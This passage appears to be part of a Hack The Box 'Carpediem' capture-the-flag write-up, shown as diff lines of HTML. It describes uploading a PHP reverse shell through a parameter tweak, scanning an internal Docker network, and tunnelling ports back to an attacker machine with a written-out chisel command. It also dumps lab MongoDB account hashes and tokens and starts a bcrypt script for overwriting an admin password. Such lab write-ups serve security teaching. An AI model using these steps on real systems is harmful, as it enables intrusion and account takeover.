+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-carpediem/13.png"
+            data-srcset="/hackthebox-carpediem/13.png, /hackthebox-carpediem/13.png 1.5x, /hackthebox-carpediem/13.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-carpediem/13.png" width="1920" height="863" />
+    </a><figcaption class="image-caption">Add Feature</figcaption>
+    </figure></p>
+<p><figure><a class="lightgallery" href="/hackthebox-carpediem/14.png" title="upload request" data-thumbnail="/hackthebox-carpediem/14.png" data-sub-html="<h2>upload request</h2><p>upload request</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-carpediem/14.png"
+            data-srcset="/hackthebox-carpediem/14.png, /hackthebox-carpediem/14.png 1.5x, /hackthebox-carpediem/14.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-carpediem/14.png" width="1920" height="768" />
+    </a><figcaption class="image-caption">upload request</figcaption>
+    </figure></p>
+<p>I tried looking for other pages which has upload functionality as well.</p>
+<h2 id="foothold">Foothold</h2>
+<p>On visiting the <code>My Account</code> page at <code>http://portal.carpediem.htb/admin/?page=user</code>, we have a upload profile photo option.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-carpediem/11.png" title="Account Details" data-thumbnail="/hackthebox-carpediem/11.png" data-sub-html="<h2>Account Details</h2><p>Account Details</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-carpediem/11.png"
+            data-srcset="/hackthebox-carpediem/11.png, /hackthebox-carpediem/11.png 1.5x, /hackthebox-carpediem/11.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-carpediem/11.png" width="1920" height="869" />
+    </a><figcaption class="image-caption">Account Details</figcaption>
+    </figure></p>
+<p>From <code>wappalyzer</code> we can determine that <code>php</code> is the backend language here so I tried uploading a php reverse shell.</p>
+<p>On uploading a photo or php shell, it calls the <code>f=save</code> parameter and due to this our shell doesn&rsquo;t get uploaded.</p>
+<p>But if we replace <code>save</code> with <code>upload</code> here it might work.</p>
+<p>A few things to note here. While uploading the file we need to change the parameter <code>f=upload</code> and form-data <code>name=&quot;file_upload&quot;</code>.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-carpediem/16.png" title="Updating the request" data-thumbnail="/hackthebox-carpediem/16.png" data-sub-html="<h2>Updating the request</h2><p>Updating the request</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-carpediem/16.png"
+            data-srcset="/hackthebox-carpediem/16.png, /hackthebox-carpediem/16.png 1.5x, /hackthebox-carpediem/16.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-carpediem/16.png" width="1919" height="773" />
+    </a><figcaption class="image-caption">Updating the request</figcaption>
+    </figure></p>
+<p>On successfully uploading, it also shows the path of the uploaded file.</p>
+<p>On visiting the path, we get the shell as <code>www-data</code> in a <code>docker</code> container.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-carpediem/17.png" title="reverse shell" data-thumbnail="/hackthebox-carpediem/17.png" data-sub-html="<h2>reverse shell</h2><p>reverse shell</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-carpediem/17.png"
+            data-srcset="/hackthebox-carpediem/17.png, /hackthebox-carpediem/17.png 1.5x, /hackthebox-carpediem/17.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-carpediem/17.png" width="1919" height="748" />
+    </a><figcaption class="image-caption">reverse shell</figcaption>
+    </figure></p>
+<p>On this <code>docker</code> container, there are a few credentials in some files in <code>/var/www/html/portal</code>.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-carpediem/18.png" title="Credentials in /var/www/html/portal/initialize.php" data-thumbnail="/hackthebox-carpediem/18.png" data-sub-html="<h2>Credentials in /var/www/html/portal/initialize.php</h2><p>Credentials in /var/www/html/portal/initialize.php</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-carpediem/18.png"
+            data-srcset="/hackthebox-carpediem/18.png, /hackthebox-carpediem/18.png 1.5x, /hackthebox-carpediem/18.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-carpediem/18.png" width="1916" height="185" />
+    </a><figcaption class="image-caption">Credentials in /var/www/html/portal/initialize.php</figcaption>
+    </figure></p>
+<p><figure><a class="lightgallery" href="/hackthebox-carpediem/19.png" title="Credentials in /var/www/html/portal/classes/DBConnection.php" data-thumbnail="/hackthebox-carpediem/19.png" data-sub-html="<h2>Credentials in /var/www/html/portal/classes/DBConnection.php</h2><p>Credentials in /var/www/html/portal/classes/DBConnection.php</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-carpediem/19.png"
+            data-srcset="/hackthebox-carpediem/19.png, /hackthebox-carpediem/19.png 1.5x, /hackthebox-carpediem/19.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-carpediem/19.png" width="1919" height="547" />
+    </a><figcaption class="image-caption">Credentials in /var/www/html/portal/classes/DBConnection.php</figcaption>
+    </figure></p>
+<p>We have nothing much to check the credentials here, so we can analyze the network.</p>
+<h3 id="analyzing-the-internal-network">Analyzing the internal network</h3>
+<p>Looking at our IP Address, we might be part of a <code>172.17.0.1</code> network.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-carpediem/20.png" title="ifconfig" data-thumbnail="/hackthebox-carpediem/20.png" data-sub-html="<h2>ifconfig</h2><p>ifconfig</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-carpediem/20.png"
+            data-srcset="/hackthebox-carpediem/20.png, /hackthebox-carpediem/20.png 1.5x, /hackthebox-carpediem/20.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-carpediem/20.png" width="1903" height="307" />
+    </a><figcaption class="image-caption">ifconfig</figcaption>
+    </figure></p>
+<p>Now we can analyze the internal network with <code>nmap</code>.</p>
+<p>From the <code>nmap</code> scan, we can see there are a few hosts up with open ports in the network.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Nmap scan report for 172.17.0.1
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE REASON
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     syn-ack
+</span></span><span class="line"><span class="cl">80/tcp open  http    syn-ack
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Nmap scan report for 172.17.0.2
+</span></span><span class="line"><span class="cl">PORT    STATE SERVICE REASON
+</span></span><span class="line"><span class="cl">21/tcp  open  ftp     syn-ack
+</span></span><span class="line"><span class="cl">80/tcp  open  http    syn-ack
+</span></span><span class="line"><span class="cl">443/tcp open  https   syn-ack
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Nmap scan report for 172.17.0.3
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE REASON
+</span></span><span class="line"><span class="cl">3306/tcp open  mysql   syn-ack
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Nmap scan report for 172.17.0.4
+</span></span><span class="line"><span class="cl">Host is up (0.00016s latency).
+</span></span><span class="line"><span class="cl">Not shown: 65534 closed ports
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE
+</span></span><span class="line"><span class="cl">27017/tcp open  unknown
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Nmap scan report for 172.17.0.6
+</span></span><span class="line"><span class="cl">Host is up (0.00016s latency).
+</span></span><span class="line"><span class="cl">Not shown: 65534 closed ports
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE
+</span></span><span class="line"><span class="cl">8118/tcp open  unknown
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="enumerating-the-discovered-services">Enumerating the discovered services</h3>
+<p>Forwarding the ports with <code>chisel</code>, we can analyze each service.</p>
+<p>On attacker machine,</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/…/hackthebox/hackthebox/machines/carpediem<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ ./chisel server --reverse --port <span class="m">8000</span>
+</span></span><span class="line"><span class="cl">2022/11/01 00:32:25 server: Reverse tunnelling enabled
+</span></span><span class="line"><span class="cl">2022/11/01 00:32:25 server: Fingerprint N/tbpQW/0xU3zbPb5OiJ6Ri2saMVmU58oModSPs3IGA<span class="o">=</span>
+</span></span><span class="line"><span class="cl">2022/11/01 00:32:25 server: Listening on http://0.0.0.0:8000
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>On target server,</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">www-data@3c371615b7aa:/tmp$ ./chisel client 10.10.14.46:8000 R:8118:172.17.0.6:8118 R:27017:172.17.0.4:27017 R:3306:172.17.0.3:3306 R:21:172.17.0.2:21 R:80:172.17.0.2:80 R:443:172.17.0.2:443<span class="p">&amp;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Here the host <code>172.17.0.1</code> is the one we found in the beginning.</p>
+<p>Host <code>172.17.0.2</code> is running <code>backdrop CMS</code> for which we don&rsquo;t currently have any credentials yet.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-carpediem/24.png" title="backdrop CMS" data-thumbnail="/hackthebox-carpediem/24.png" data-sub-html="<h2>backdrop CMS</h2><p>backdrop CMS</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-carpediem/24.png"
+            data-srcset="/hackthebox-carpediem/24.png, /hackthebox-carpediem/24.png 1.5x, /hackthebox-carpediem/24.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-carpediem/24.png" width="1920" height="868" />
+    </a><figcaption class="image-caption">backdrop CMS</figcaption>
+    </figure></p>
+<p>Host <code>172.17.0.3</code> is running a mysql service.</p>
+<p>Host <code>172.17.0.4</code> is running mongodb.</p>
+<p>Host <code>172.17.0.6</code> is running <code>trudesk</code> login page.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-carpediem/25.png" title="trudesk login" data-thumbnail="/hackthebox-carpediem/25.png" data-sub-html="<h2>trudesk login</h2><p>trudesk login</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-carpediem/25.png"
+            data-srcset="/hackthebox-carpediem/25.png, /hackthebox-carpediem/25.png 1.5x, /hackthebox-carpediem/25.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-carpediem/25.png" width="1920" height="871" />
+    </a><figcaption class="image-caption">trudesk login</figcaption>
+    </figure></p>
+<h3 id="infiltrating-using-mongodb-and-trudesk">Infiltrating using mongodb and trudesk.</h3>
+<p>Visiting port <code>27017</code> on web browser throws an error.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-carpediem/26.png" title="mongodb on web" data-thumbnail="/hackthebox-carpediem/26.png" data-sub-html="<h2>mongodb on web</h2><p>mongodb on web</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-carpediem/26.png"
+            data-srcset="/hackthebox-carpediem/26.png, /hackthebox-carpediem/26.png 1.5x, /hackthebox-carpediem/26.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-carpediem/26.png" width="1920" height="862" />
+    </a><figcaption class="image-caption">mongodb on web</figcaption>
+    </figure></p>
+<p>But we can access it through <a href="https://www.mongodb.com/docs/mongodb-shell/install/" target="_blank" rel="noopener noreffer ">mongosh</a>.</p>
+<p>After analyzing the mongodb, we found some credentials.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/…/hackthebox/hackthebox/machines/carpediem<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ mongosh mongodb://127.0.0.1:27017
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">test&gt; show dbs
+</span></span><span class="line"><span class="cl">admin    132.00 KiB
+</span></span><span class="line"><span class="cl">config   108.00 KiB
+</span></span><span class="line"><span class="cl"><span class="nb">local</span>     88.00 KiB
+</span></span><span class="line"><span class="cl">trudesk    1.07 MiB
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">test&gt; use trudesk
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">trudesk&gt; show collections
+</span></span><span class="line"><span class="cl">accounts
+</span></span><span class="line"><span class="cl">counters
+</span></span><span class="line"><span class="cl">departments
+</span></span><span class="line"><span class="cl">groups
+</span></span><span class="line"><span class="cl">messages
+</span></span><span class="line"><span class="cl">notifications
+</span></span><span class="line"><span class="cl">priorities
+</span></span><span class="line"><span class="cl">role_order
+</span></span><span class="line"><span class="cl">roles
+</span></span><span class="line"><span class="cl">sessions
+</span></span><span class="line"><span class="cl">settings
+</span></span><span class="line"><span class="cl">tags
+</span></span><span class="line"><span class="cl">teams
+</span></span><span class="line"><span class="cl">templates
+</span></span><span class="line"><span class="cl">tickets
+</span></span><span class="line"><span class="cl">tickettypes
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">trudesk&gt; db.accounts.find<span class="o">()</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>
+</span></span><span class="line"><span class="cl">  <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    _id: ObjectId<span class="o">(</span><span class="s2">&#34;623c8b20855cc5001a8ba13c&#34;</span><span class="o">)</span>,
+</span></span><span class="line"><span class="cl">    preferences: <span class="o">{</span>
+</span></span><span class="line"><span class="cl">      tourCompleted: false,
+</span></span><span class="line"><span class="cl">      autoRefreshTicketGrid: true,
+</span></span><span class="line"><span class="cl">      openChatWindows: <span class="o">[]</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>,
+</span></span><span class="line"><span class="cl">    hasL2Auth: false,
+</span></span><span class="line"><span class="cl">    deleted: false,
+</span></span><span class="line"><span class="cl">    username: <span class="s1">&#39;admin&#39;</span>,
+</span></span><span class="line"><span class="cl">    password: <span class="s1">&#39;$2b$10$imwoLPu0Au8LjNr08GXGy.xk/Exyr9PhKYk1lC/sKAfMFd5i3HrmS&#39;</span>,
+</span></span><span class="line"><span class="cl">    fullname: <span class="s1">&#39;Robert Frost&#39;</span>,
+</span></span><span class="line"><span class="cl">    email: <span class="s1">&#39;rfrost@carpediem.htb&#39;</span>,
+</span></span><span class="line"><span class="cl">    role: ObjectId<span class="o">(</span><span class="s2">&#34;623c8b20855cc5001a8ba138&#34;</span><span class="o">)</span>,
+</span></span><span class="line"><span class="cl">    title: <span class="s1">&#39;Sr. Network Engineer&#39;</span>,
+</span></span><span class="line"><span class="cl">    accessToken: <span class="s1">&#39;22e56ec0b94db029b07365d520213ef6f5d3d2d9&#39;</span>,
+</span></span><span class="line"><span class="cl">    __v: 0,
+</span></span><span class="line"><span class="cl">    lastOnline: ISODate<span class="o">(</span><span class="s2">&#34;2022-04-07T20:30:32.198Z&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">  <span class="o">}</span>,
+</span></span><span class="line"><span class="cl">  <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    _id: ObjectId<span class="o">(</span><span class="s2">&#34;6243c0be1e0d4d001b0740d4&#34;</span><span class="o">)</span>,
+</span></span><span class="line"><span class="cl">    preferences: <span class="o">{</span>
+</span></span><span class="line"><span class="cl">      tourCompleted: false,
+</span></span><span class="line"><span class="cl">      autoRefreshTicketGrid: true,
+</span></span><span class="line"><span class="cl">      openChatWindows: <span class="o">[]</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>,
+</span></span><span class="line"><span class="cl">    hasL2Auth: false,
+</span></span><span class="line"><span class="cl">    deleted: false,
+</span></span><span class="line"><span class="cl">    username: <span class="s1">&#39;jhammond&#39;</span>,
+</span></span><span class="line"><span class="cl">    email: <span class="s1">&#39;jhammond@carpediem.htb&#39;</span>,
+</span></span><span class="line"><span class="cl">    password: <span class="s1">&#39;$2b$10$n4yEOTLGA0SuQ.o0CbFbsex3pu2wYr924cKDaZgLKFH81Wbq7d9Pq&#39;</span>,
+</span></span><span class="line"><span class="cl">    fullname: <span class="s1">&#39;Jeremy Hammond&#39;</span>,
+</span></span><span class="line"><span class="cl">    title: <span class="s1">&#39;Sr. Systems Engineer&#39;</span>,
+</span></span><span class="line"><span class="cl">    role: ObjectId<span class="o">(</span><span class="s2">&#34;623c8b20855cc5001a8ba139&#34;</span><span class="o">)</span>,
+</span></span><span class="line"><span class="cl">    accessToken: <span class="s1">&#39;a0833d9a06187dfd00d553bd235dfe83e957fd98&#39;</span>,
+</span></span><span class="line"><span class="cl">    __v: 0,
+</span></span><span class="line"><span class="cl">    lastOnline: ISODate<span class="o">(</span><span class="s2">&#34;2022-04-01T23:36:55.940Z&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">  <span class="o">}</span>,
+</span></span><span class="line"><span class="cl">  <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    _id: ObjectId<span class="o">(</span><span class="s2">&#34;6243c28f1e0d4d001b0740d6&#34;</span><span class="o">)</span>,
+</span></span><span class="line"><span class="cl">    preferences: <span class="o">{</span>
+</span></span><span class="line"><span class="cl">      tourCompleted: false,
+</span></span><span class="line"><span class="cl">      autoRefreshTicketGrid: true,
+</span></span><span class="line"><span class="cl">      openChatWindows: <span class="o">[]</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>,
+</span></span><span class="line"><span class="cl">    hasL2Auth: false,
+</span></span><span class="line"><span class="cl">    deleted: false,
+</span></span><span class="line"><span class="cl">    username: <span class="s1">&#39;jpardella&#39;</span>,
+</span></span><span class="line"><span class="cl">    email: <span class="s1">&#39;jpardella@carpediem.htb&#39;</span>,
+</span></span><span class="line"><span class="cl">    password: <span class="s1">&#39;$2b$10$nNoQGPes116eTUUl/3C8keEwZAeCfHCmX1t.yA1X3944WB2F.z2GK&#39;</span>,
+</span></span><span class="line"><span class="cl">    fullname: <span class="s1">&#39;Joey Pardella&#39;</span>,
+</span></span><span class="line"><span class="cl">    title: <span class="s1">&#39;Desktop Support&#39;</span>,
+</span></span><span class="line"><span class="cl">    role: ObjectId<span class="o">(</span><span class="s2">&#34;623c8b20855cc5001a8ba139&#34;</span><span class="o">)</span>,
+</span></span><span class="line"><span class="cl">    accessToken: <span class="s1">&#39;7c0335559073138d82b64ed7b6c3efae427ece85&#39;</span>,
+</span></span><span class="line"><span class="cl">    __v: 0,
+</span></span><span class="line"><span class="cl">    lastOnline: ISODate<span class="o">(</span><span class="s2">&#34;2022-04-07T20:33:20.918Z&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">  <span class="o">}</span>,
+</span></span><span class="line"><span class="cl">  <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    _id: ObjectId<span class="o">(</span><span class="s2">&#34;6243c3471e0d4d001b0740d7&#34;</span><span class="o">)</span>,
+</span></span><span class="line"><span class="cl">    preferences: <span class="o">{</span>
+</span></span><span class="line"><span class="cl">      tourCompleted: false,
+</span></span><span class="line"><span class="cl">      autoRefreshTicketGrid: true,
+</span></span><span class="line"><span class="cl">      openChatWindows: <span class="o">[]</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>,
+</span></span><span class="line"><span class="cl">    hasL2Auth: false,
+</span></span><span class="line"><span class="cl">    deleted: false,
+</span></span><span class="line"><span class="cl">    username: <span class="s1">&#39;acooke&#39;</span>,
+</span></span><span class="line"><span class="cl">    email: <span class="s1">&#39;acooke@carpediem.htb&#39;</span>,
+</span></span><span class="line"><span class="cl">    password: <span class="s1">&#39;$2b$10$qZ64GjhVYetulM.dqt73zOV8IjlKYKtM/NjKPS1PB0rUcBMkKq0s.&#39;</span>,
+</span></span><span class="line"><span class="cl">    fullname: <span class="s1">&#39;Adeanna Cooke&#39;</span>,
+</span></span><span class="line"><span class="cl">    title: <span class="s1">&#39;Director - Human Resources&#39;</span>,
+</span></span><span class="line"><span class="cl">    role: ObjectId<span class="o">(</span><span class="s2">&#34;623c8b20855cc5001a8ba139&#34;</span><span class="o">)</span>,
+</span></span><span class="line"><span class="cl">    accessToken: <span class="s1">&#39;9c7ace307a78322f1c09d62aae3815528c3b7547&#39;</span>,
+</span></span><span class="line"><span class="cl">    __v: 0,
+</span></span><span class="line"><span class="cl">    lastOnline: ISODate<span class="o">(</span><span class="s2">&#34;2022-03-30T14:21:15.212Z&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">  <span class="o">}</span>,
+</span></span><span class="line"><span class="cl">  <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    _id: ObjectId<span class="o">(</span><span class="s2">&#34;6243c69d1acd1559cdb4019b&#34;</span><span class="o">)</span>,
+</span></span><span class="line"><span class="cl">    preferences: <span class="o">{</span>
+</span></span><span class="line"><span class="cl">      tourCompleted: false,
+</span></span><span class="line"><span class="cl">      autoRefreshTicketGrid: true,
+</span></span><span class="line"><span class="cl">      openChatWindows: <span class="o">[]</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>,
+</span></span><span class="line"><span class="cl">    hasL2Auth: false,
+</span></span><span class="line"><span class="cl">    deleted: false,
+</span></span><span class="line"><span class="cl">    username: <span class="s1">&#39;svc-portal-tickets&#39;</span>,
+</span></span><span class="line"><span class="cl">    email: <span class="s1">&#39;tickets@carpediem.htb&#39;</span>,
+</span></span><span class="line"><span class="cl">    password: <span class="s1">&#39;$2b$10$CSRmXjH/psp9DdPmVjEYLOUEkgD7x8ax1S1yks4CTrbV6bfgBFXqW&#39;</span>,
+</span></span><span class="line"><span class="cl">    fullname: <span class="s1">&#39;Portal Tickets&#39;</span>,
+</span></span><span class="line"><span class="cl">    title: <span class="s1">&#39;&#39;</span>,
+</span></span><span class="line"><span class="cl">    role: ObjectId<span class="o">(</span><span class="s2">&#34;623c8b20855cc5001a8ba13a&#34;</span><span class="o">)</span>,
+</span></span><span class="line"><span class="cl">    accessToken: <span class="s1">&#39;f8691bd2d8d613ec89337b5cd5a98554f8fffcc4&#39;</span>,
+</span></span><span class="line"><span class="cl">    __v: 0,
+</span></span><span class="line"><span class="cl">    lastOnline: ISODate<span class="o">(</span><span class="s2">&#34;2022-03-30T13:50:02.824Z&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">  <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">]</span>
+</span></span><span class="line"><span class="cl">trudesk&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Sadly, they are not crackable. But since we have full read/write access to the db, we can update entries here as well.</p>
+<p>Looking <a href="https://github.com/polonel/trudesk/blob/fbe39063262df9312885bdbf2c95725d8e46794c/src/models/user.js" target="_blank" rel="noopener noreffer ">here</a> we can see that <code>trudesk</code> uses <code>bcrypt</code> to hash the passwords. We can write a simple <code>python</code> program (<a href="https://zetcode.com/python/bcrypt/" target="_blank" rel="noopener noreffer ">reference</a>) to generate a similar hash and replace the original one.</p>
+<p>Generating the salt,</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">bcrypt</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">newPassword</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;supersecretpassword&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">salt</span> <span class="o">=</span> <span class="n">bcrypt</span><span class="o">.</span><span class="n">gensalt</span><span class="p">(</span><span class="n">rounds</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">genPassword</span> <span class="o">=</span> <span class="n">bcrypt</span><span class="o">.</span><span class="n">hashpw</span><span class="p">(</span><span class="n">newPassword</span><span class="p">,</span><span class="n">salt</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">genPassword</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Then running this file,</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
